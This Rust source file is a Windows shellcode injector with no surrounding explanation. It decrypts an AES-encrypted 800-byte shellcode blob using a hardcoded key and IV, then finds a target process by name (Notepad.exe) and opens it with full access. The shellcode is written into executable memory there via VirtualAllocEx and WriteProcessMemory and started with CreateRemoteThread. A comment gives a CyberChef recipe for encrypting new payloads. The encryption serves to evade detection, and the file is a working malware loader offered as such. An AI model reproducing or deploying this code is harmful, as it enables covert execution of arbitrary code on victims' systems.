use core::ffi::c_void;
use libaes::Cipher;
use windows::core::{HRESULT, Error};
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::System::{
    Diagnostics::Debug::WriteProcessMemory,
    Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
    ProcessStatus::{K32EnumProcesses, K32GetModuleBaseNameW},
    Threading::{CreateRemoteThread, OpenProcess, LPTHREAD_START_ROUTINE, PROCESS_ALL_ACCESS},
};

fn inject_explorer(process_name: String) -> Result<HANDLE, windows::core::Error> {
    let key: [u8; 16] = [
        0x4f, 0x20, 0x08, 0xd7, 0x2f, 0x29, 0xb5, 0xec, 0x5c, 0xc3, 0xbf, 0xef, 0x6f, 0x99, 0xbb,
        0xbd,
    ];
    let iv: [u8; 16] = [
        0x00, 0xc9, 0x13, 0x92, 0xb6, 0x5d, 0xaa, 0xd1, 0xc9, 0xb9, 0x68, 0x2b, 0x0f, 0x7c, 0x58,
        0xd8,
    ];

    // encrypt with https://gchq.github.io/CyberChef/#recipe=Remove_whitespace(true,true,true,true,true,false)From_Hex('0x%20with%20comma')AES_Encrypt(%7B'option':'Hex','string':'81%2005%208b%2053%20fc%20d4%205d%20c8%2055%20f7%20f0%20f7%2044%204d%2088%20db'%7D,%7B'option':'UTF8','string':'This%20is%2016%20bytes'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D)To_Hex('0x%20with%20comma',0)
    let shellcode_encrypted: [u8; 800] = [
        0xd8, 0xfb, 0xd4, 0xe7, 0xad, 0x37, 0x8e, 0xd2, 0x9c, 0x49, 0xcf, 0x50, 0xee, 0x92, 0xe7,
        0xad, 0x25, 0x0f, 0x67, 0x10, 0xf7, 0x41, 0xba, 0xaa, 0xfa, 0x43, 0xf5, 0xa7, 0x44, 0xa8,
        0x4e, 0x55, 0x34, 0xa6, 0xa0, 0xba, 0x86, 0x6b, 0x3b, 0x41, 0x0c, 0x5c, 0xa2, 0x01, 0xf8,
        0xa2, 0xde, 0xc1, 0x0a, 0x3c, 0xb6, 0xdf, 0xdd, 0xaa, 0xd9, 0xb0, 0xd1, 0x0e, 0x5b, 0xa9,
        0x52, 0x76, 0xa5, 0x46, 0x4b, 0x66, 0x4b, 0x8f, 0xb3, 0xfd, 0xfc, 0xae, 0x59, 0x8d, 0x87,
        0x07, 0x31, 0x01, 0x72, 0xc4, 0xd0, 0x54, 0xba, 0x7b, 0xea, 0xec, 0x43, 0xb3, 0xd3, 0x7c,
        0x88, 0xa9, 0xec, 0xac, 0x83, 0x6b, 0x33, 0xe1, 0xa6, 0x41, 0xe9, 0x26, 0x3a, 0x54, 0x52,
        0x32, 0x3a, 0xa4, 0xc8, 0x33, 0x33, 0x2d, 0x4b, 0xb8, 0x4f, 0xf1, 0x66, 0xb5, 0xeb, 0xf4,
        0x3f, 0x5c, 0xea, 0x08, 0x1d, 0x8c, 0xcb, 0x9a, 0x11, 0x06, 0xe2, 0x19, 0x4e, 0xb8, 0x55,
        0x32, 0x10, 0xd9, 0x12, 0xc0, 0xa2, 0xa9, 0x17, 0xe4, 0x65, 0xfc, 0xf9, 0x5f, 0x87, 0x08,
        0x2e, 0x2f, 0xe0, 0xa5, 0x7a, 0x07, 0xc4, 0x9b, 0x85, 0x74, 0xc6, 0x4b, 0xb7, 0xf3, 0xcf,
        0xa4, 0x1d, 0xbc, 0x78, 0x65, 0x5a, 0x36, 0xb0, 0x05, 0x71, 0x25, 0x84, 0x37, 0xe6, 0x7a,
        0x28, 0x1b, 0x46, 0xa4, 0x28, 0xbb, 0xfc, 0xc6, 0x41, 0x87, 0x4f, 0x07, 0x68, 0x24, 0xef,
        0x2a, 0x5d, 0x33, 0x2f, 0x74, 0xd6, 0xad, 0xa9, 0xe1, 0x7a, 0x90, 0xa2, 0x00, 0x87, 0xcd,
        0x5e, 0xfa, 0xe8, 0x8a, 0x66, 0xa4, 0x34, 0xe3, 0xf3, 0x66, 0x5d, 0xd6, 0x12, 0x49, 0x2c,
        0x04, 0x65, 0xb0, 0x64, 0x17, 0x60, 0x13, 0x03, 0xf9, 0xed, 0xde, 0x53, 0x06, 0x2e, 0x76,
        0x0c, 0x6c, 0x84, 0x3b, 0x59, 0xc9, 0xd4, 0xc2, 0xf7, 0x8d, 0x67, 0x58, 0x79, 0xc0, 0xbf,
        0xf5, 0x4c, 0x6c, 0x39, 0x62, 0xd8, 0xe7, 0x26, 0xde, 0xad, 0xcb, 0x51, 0x2e, 0x19, 0xca,
        0x11, 0x00, 0x39, 0xd3, 0xc9, 0x6c, 0x44, 0xe4, 0x7e, 0xbe, 0x4c, 0x71, 0x1d, 0x95, 0xd1,
        0xa7, 0x1b, 0xfa, 0xc5, 0x5e, 0x6b, 0x59, 0x1a, 0x8b, 0xd6, 0x00, 0x3d, 0xa5, 0x65, 0x5b,
        0x29, 0x11, 0x45, 0x49, 0x15, 0x76, 0x7f, 0x7b, 0xf4, 0x4b, 0xcc, 0x16, 0xc9, 0x8f, 0x9a,
        0x84, 0xcb, 0xa2, 0x9f, 0x6f, 0x09, 0x0b, 0x34, 0xad, 0x8c, 0xb4, 0xdd, 0xe5, 0x37, 0x5a,
        0x96, 0x21, 0x7e, 0x64, 0x78, 0x2b, 0x60, 0x71, 0x2f, 0x6d, 0x46, 0x41, 0x75, 0x21, 0xf6,
        0x02, 0xe9, 0x6e, 0x1d, 0x08, 0x01, 0x8b, 0xec, 0xb3, 0xdc, 0x9e, 0x78, 0xd4, 0x7b, 0xcd,
        0x19, 0x7a, 0xcd, 0xca, 0x0a, 0x85, 0x1c, 0x26, 0xd4, 0xcb, 0x82, 0xad, 0xdb, 0x03, 0x1c,
        0xe7, 0x5c, 0xed, 0x6a, 0xb4, 0x45, 0xc0, 0x1b, 0x45, 0x44, 0xd7, 0xe0, 0x51, 0x6b, 0x19,
        0xb6, 0x00, 0x3e, 0x7d, 0xc6, 0xd5, 0x3f, 0xd0, 0x48, 0x70, 0x46, 0xc0, 0x63, 0x08, 0xdc,
        0xbc, 0x41, 0x2e, 0xcb, 0x8f, 0xe1, 0xb0, 0x93, 0x26, 0x66, 0xcf, 0x14, 0xaa, 0x99, 0xd0,
        0xf5, 0xf6, 0x1d, 0xf0, 0xed, 0x21, 0x1e, 0x5b, 0x18, 0x26, 0xe0, 0x96, 0x91, 0x5a, 0x8f,
        0xa8, 0x42, 0x4d, 0xf7, 0xa9, 0x8d, 0xd5, 0xe4, 0xed, 0x08, 0xd6, 0x63, 0xb3, 0xed, 0x80,
        0x81, 0x66, 0x33, 0x3e, 0xff, 0xd3, 0x06, 0x4d, 0xd0, 0x7f, 0x65, 0x6d, 0x62, 0xf6, 0x86,
        0x95, 0x23, 0x3c, 0xf5, 0x24, 0xf3, 0xec, 0xe0, 0x4c, 0xa2, 0x61, 0x0e, 0xb3, 0x65, 0x72,
        0x80, 0xbd, 0x24, 0xa7, 0xe3, 0x27, 0x00, 0x38, 0x7a, 0x88, 0x75, 0x8f, 0x05, 0x34, 0x11,
        0x46, 0x82, 0x6b, 0x7b, 0x22, 0xe1, 0x63, 0x4e, 0x37, 0xcc, 0xe8, 0x81, 0xe6, 0xb9, 0x13,
        0x00, 0xc4, 0xf6, 0x77, 0x5a, 0xd0, 0x74, 0x37, 0xa5, 0xad, 0x7f, 0xc1, 0xec, 0x90, 0xfc,
        0xa0, 0x49, 0xf7, 0xe6, 0x09, 0xf1, 0x8d, 0xfc, 0x8b, 0xc7, 0x09, 0x57, 0xc5, 0x82, 0xff,
        0x1e, 0x59, 0x21, 0xe4, 0x50, 0x0d, 0x2a, 0x8f, 0xfc, 0x8e, 0xc1, 0xc0, 0x27, 0x73, 0xcc,
        0x98, 0x12, 0xac, 0xf0, 0xfa, 0x22, 0x65, 0x65, 0x90, 0xc4, 0x19, 0x99, 0xcd, 0x03, 0x31,
        0xf7, 0xeb, 0xe2, 0xea, 0xe6, 0x8d, 0xcb, 0xdd, 0x90, 0x54, 0x03, 0x97, 0x6b, 0xfe, 0x83,
        0x1f, 0x74, 0x26, 0xa4, 0x3d, 0x3f, 0x6b, 0xfc, 0x65, 0xa8, 0x3d, 0xcd, 0xb4, 0x13, 0xa0,
        0xe7, 0x8e, 0xd9, 0xd6, 0x61, 0x65, 0x94, 0xe3, 0x1e, 0x5e, 0x8a, 0x4a, 0xd2, 0x05, 0x15,
        0xad, 0x13, 0x36, 0x56, 0x98, 0x48, 0x9d, 0xd1, 0xbc, 0x69, 0x06, 0xee, 0x27, 0xd6, 0xcb,
        0xb1, 0x21, 0x1e, 0x70, 0xbd, 0x70, 0x84, 0xec, 0x20, 0x02, 0xb9, 0x40, 0x84, 0x5a, 0x6a,
        0x6f, 0x69, 0xf2, 0x9d, 0xf6, 0x92, 0x39, 0x84, 0x93, 0x46, 0xa4, 0x73, 0x57, 0xe8, 0x96,
        0x98, 0x4c, 0x6a, 0xb7, 0x27, 0xd9, 0x19, 0xd8, 0x75, 0xb3, 0x10, 0xce, 0x66, 0x86, 0x77,
        0xc6, 0x34, 0x73, 0x2e, 0x29, 0xa2, 0x7f, 0xa2, 0xb1, 0xbc, 0x5b, 0x25, 0xc1, 0xdf, 0x10,
        0xad, 0x12, 0x36, 0x12, 0x50, 0x48, 0x2c, 0x2b, 0x81, 0x12, 0xd7, 0x3d, 0xea, 0xa2, 0x8d,
        0xd4, 0xd0, 0xc9, 0x11, 0xbf, 0x89, 0xfc, 0xd7, 0x59, 0x65, 0xe1, 0x3d, 0x0d, 0x7f, 0xe0,
        0x01, 0x16, 0x4d, 0x18, 0x12, 0xd0, 0xbb, 0xf4, 0x40, 0x6e, 0x24, 0xd0, 0x94, 0x50, 0x41,
        0x12, 0x5d, 0x39, 0xbc, 0xe6, 0x12, 0xdd, 0x1d, 0x60, 0x68, 0xcc, 0xb4, 0x74, 0x52, 0xa7,
        0x49, 0x2d, 0x04, 0x00, 0x7c, 0x88, 0xd0, 0x28, 0x2c, 0x22, 0x77, 0x8f, 0x93, 0xf5, 0x04,
        0x06, 0x3a, 0x6d, 0x62, 0x3b, 0x41, 0xc3, 0xe2, 0x8d, 0xc3, 0x28, 0x73, 0xdf, 0x48, 0x0d,
        0xa9, 0xbb, 0x40, 0xe5, 0x69, 0x92, 0xf9, 0xa8, 0xe9, 0x6e, 0x49, 0x7c, 0x64, 0x0f, 0x07,
        0xdd, 0xb5, 0xf4, 0xb9, 0x39,
    ];

    let cipher = Cipher::new_128(&key);
    let buf = cipher.cbc_decrypt(&iv, &shellcode_encrypted[..]);
    let h_process: HANDLE;
    let addr: *mut c_void;

    h_process = find_process(process_name).ok_or(Error::from(HRESULT(1168)))?;

    println!("h_process: {:?}", h_process);
    unsafe {
        addr = VirtualAllocEx(
            h_process,
            None,
            0x1000,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
    }

    let nb_written_bytes: Option<*mut usize> = Default::default();
    let shellcode = buf.as_ptr() as *const c_void;

    if unsafe { WriteProcessMemory(h_process, addr, shellcode, buf.len(), nb_written_bytes) }
        == false
    {
        println!("Error in WriteProcessMemory");
        return Err(windows::core::Error::from_win32());
    }

    let base_addr: LPTHREAD_START_ROUTINE;
    unsafe {
        base_addr = Some(
            *(&addr as *const _
                as *const extern "system" fn(lpthreadparameter: *mut c_void) -> u32),
        );
    }
    return unsafe { CreateRemoteThread(h_process, None, 0, base_addr, None, 0, None) };
}

fn find_process(process_name: String) -> Option<HANDLE> {
    let nb_process: usize;
    let mut process_array = Vec::<u32>::with_capacity(2048);
    let mut cb_needed = 0;

    //    1. create an array of all processes
    if unsafe {
        K32EnumProcesses(
            process_array.as_mut_ptr(),
            (process_array.capacity() * std::mem::size_of::<u32>()) as u32,
            &mut cb_needed,
        )
    } == false
    {
        println!("Could not enumerate processes.");
        return None;
    } else {
        nb_process = (cb_needed as usize) / std::mem::size_of::<u32>();
        unsafe { process_array.set_len(nb_process) };
    }
    println!("Found {} processes.", nb_process);

    //    2. Open all processes and get their ModuleBaseName
    for pid in process_array {
        unsafe {
            if let Some(h_process) = OpenProcess(PROCESS_ALL_ACCESS, false, pid).ok() {
                //                return Some(h_process);
                let mut target_process_name = [0u16; 125];
                K32GetModuleBaseNameW(h_process, None, target_process_name.as_mut());
                //                3. compare the process name
                if String::from_utf16_lossy(&target_process_name).contains(&process_name.as_str()) {
                    println!("Found process with id: {}", pid);
                    return Some(h_process);
                }
            }
        }
    }
    println!("Process not found :-(");
    return None;
}

fn main() {
    println!("Hello, world!");
    let process_name = "Notepad.exe".to_string();
    match inject_explorer(process_name) {
        Ok(h) => println!("Process has been injected: {}", unsafe {
            CloseHandle(h).as_bool()
        }),
        Err(e) => println!("Error during injection: {:?}", e),
    }
}
